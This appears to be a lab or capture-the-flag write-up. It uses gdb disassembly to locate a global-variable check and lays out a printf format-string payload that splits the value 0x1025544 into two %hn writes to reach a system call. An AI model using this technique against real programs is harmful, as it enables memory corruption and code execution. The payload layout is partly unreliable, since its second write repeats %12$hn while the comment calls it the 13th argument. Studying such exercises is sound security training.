The <main> function makes a call to <n> function.

$ (gdb) disas main
...
0x080484ad <+6>:	call   0x8048457 <n>
...

The <n> function makes a call to <p> function which uses printf.

$ (gdb) disas n
...
0x08048488 <+49>:	call   0x8048444 <p>
...

To get to the <system> call we need to pass the following check that compares
the variable <m> to 0x1025544

0x0804848d <+54>:	mov    eax, ds:0x8049810
0x08048492 <+59>:	cmp    eax, 0x1025544

This means we want to write 0x1025544 at 0x8049810.
Playing around with printf we notice that we control the 12th argument on the stack.
But, we cannot pipe 16930116 bytes at once so we split the value 0x1025544 into 0x0102 (258) and 0x5544 (21828)

The formula is then :
	<addr+2>		: for the high part of the target address
	<addr>			: for the low part of the target address
	<250(-8)>		: 0x0102 minus the 8 bytes of the 1st address
	<%12$hn>		: write it at 1st address as 12th argument on the stack
	<21828(-258)>	: 0x5544 minus the 258 bytes already printed
	<%12$hn>		: write it at 2nd address as 13th argument on the stack
